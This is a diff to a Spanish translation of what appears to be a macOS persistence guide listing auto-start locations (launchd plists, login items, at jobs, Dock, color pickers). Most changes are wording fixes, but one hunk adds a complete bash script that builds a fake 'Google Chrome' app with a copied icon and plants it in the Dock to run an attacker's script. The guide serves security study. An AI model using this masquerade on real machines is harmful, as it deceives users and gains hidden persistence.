@@ -28,22 +28,22 @@ Aquí puedes encontrar ubicaciones de inicio útiles para **bypass de sandbox** 
 
 * **`/Library/LaunchAgents`**
 * **Disparador**: Reinicio
-* Se requiere acceso de root
+* Se requiere root
 * **`/Library/LaunchDaemons`**
 * **Disparador**: Reinicio
-* Se requiere acceso de root
+* Se requiere root
 * **`/System/Library/LaunchAgents`**
 * **Disparador**: Reinicio
-* Se requiere acceso de root
+* Se requiere root
 * **`/System/Library/LaunchDaemons`**
 * **Disparador**: Reinicio
-* Se requiere acceso de root
+* Se requiere root
 * **`~/Library/LaunchAgents`**
 * **Disparador**: Volver a iniciar sesión
 * **`~/Library/LaunchDemons`**
 * **Disparador**: Volver a iniciar sesión
 
-#### Descripción y explotación
+#### Descripción y Explotación
 
 **`launchd`** es el **primer** **proceso** ejecutado por el kernel de OX S al iniciar y el último en finalizar al apagar. Siempre debe tener el **PID 1**. Este proceso **lee y ejecuta** las configuraciones indicadas en los **plists** de **ASEP** en:
 
@@ -143,7 +143,7 @@ Configurar la explotación indicada y cerrar sesión e iniciar sesión o incluso
 
 #### Descripción y explotación
 
-Todas las aplicaciones que se reabrirán están dentro del archivo plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`
+Todas las aplicaciones que se reabrirán se encuentran dentro del archivo plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`
 
 Para hacer que las aplicaciones reabiertas ejecuten tu propia aplicación, solo necesitas **agregar tu aplicación a la lista**.
 
@@ -169,7 +169,7 @@ Para **agregar una aplicación a esta lista** puedes usar:
 
 En **`~/Library/Preferences`** se almacenan las preferencias del usuario en las aplicaciones. Algunas de estas preferencias pueden contener una configuración para **ejecutar otras aplicaciones/scripts**.
 
-Por ejemplo, Terminal puede ejecutar un comando en el inicio:
+Por ejemplo, Terminal puede ejecutar un comando al inicio:
 
 <figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>
 
@@ -521,7 +521,7 @@ Esto creará un archivo en 1 hora:
 ```bash
 echo "echo 11 > /tmp/at.txt" | at now+1
 ```
-Verifique la cola de trabajos usando `atq:`
+Verifique la cola de trabajos utilizando `atq:`
 ```shell-session
 sh-3.2# atq
 26	Tue Apr 27 00:46:00 2021
@@ -713,7 +713,7 @@ Informe: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.
 #### Ubicación
 
 * `~/Library/Preferences/com.apple.dock.plist`
-* **Disparador**: Cuando el usuario hace clic en la aplicación dentro del Dock
+* **Disparador**: Cuando el usuario hace clic en la aplicación dentro del dock
 
 #### Descripción y Explotación
 
@@ -731,7 +731,60 @@ killall Dock
 ```
 {% endcode %}
 
-### Selector de colores
+Usando ingeniería social, podrías hacer pasar por ejemplo a Google Chrome dentro del dock y ejecutar tu propio script:
+```bash
+#!/bin/sh
+
+# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
+
+rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null
+
+# Create App structure
+mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
+mkdir -p /tmp/Google\ Chrome.app/Contents/Resources
+
+# Payload to execute
+echo '#!/bin/sh
+open /Applications/Google\ Chrome.app/ &
+touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
+
+chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
+
+# Info.plist
+cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>CFBundleExecutable</key>
+<string>Google Chrome</string>
+<key>CFBundleIdentifier</key>
+<string>com.google.Chrome</string>
+<key>CFBundleName</key>
+<string>Google Chrome</string>
+<key>CFBundleVersion</key>
+<string>1.0</string>
+<key>CFBundleShortVersionString</key>
+<string>1.0</string>
+<key>CFBundleInfoDictionaryVersion</key>
+<string>6.0</string>
+<key>CFBundlePackageType</key>
+<string>APPL</string>
+<key>CFBundleIconFile</key>
+<string>app</string>
+</dict>
+</plist>
+EOF
+
+# Copy icon from Google Chrome
+cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns
+
+# Add to Dock
+defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
+killall Dock
+```
+### Selectores de color
 
 Descripción: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)
 
@@ -742,18 +795,18 @@ Descripción: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevil
 #### Ubicación
 
 * `/Library/ColorPickers`&#x20;
-* Se requieren permisos de root
-* Desencadenador: Usar el selector de colores
+* Se requiere acceso de root
+* Desencadenador: Usar el selector de color
 * `~/Library/ColorPickers`
-* Desencadenador: Usar el selector de colores
+* Desencadenador: Usar el selector de color
 
 #### Descripción y Exploit
 
-**Compila un paquete** de selector de colores con tu código (puedes usar [**este, por ejemplo**](https://github.com/viktorstrate/color-picker-plus)) y agrega un constructor (como en la sección de [Protector de pantalla](macos-auto-start-locations.md#screen-saver)) y copia el paquete a `~/Library/ColorPickers`.
+**Compila un paquete** de selector de color con tu código (puedes usar [**este, por ejemplo**](https://github.com/viktorstrate/color-picker-plus)) y agrega un constructor (como en la sección de Salvapantallas) y copia el paquete a `~/Library/ColorPickers`.
 
-Entonces, cuando se active el selector de colores, tu código también debería ejecutarse.
+Entonces, cuando se active el selector de color, tu código también debería ejecutarse.
 
-Ten en cuenta que la carga binaria de tu biblioteca tiene un **sandbox muy restrictivo**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
+Ten en cuenta que la carga binaria de tu biblioteca tiene un sandbox **muy restrictivo**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
 
 {% code overflow="wrap" %}
 ```bash
@@ -1136,7 +1189,7 @@ Después de colocar un nuevo directorio en una de estas dos ubicaciones, se debe
 </dict>
 </plist>
 ```
-{% tab title="superservicename" %}Nombre del servicio súper
+{% tab title="superservicename" %}
 ```bash
 #!/bin/sh
 . /etc/rc.common
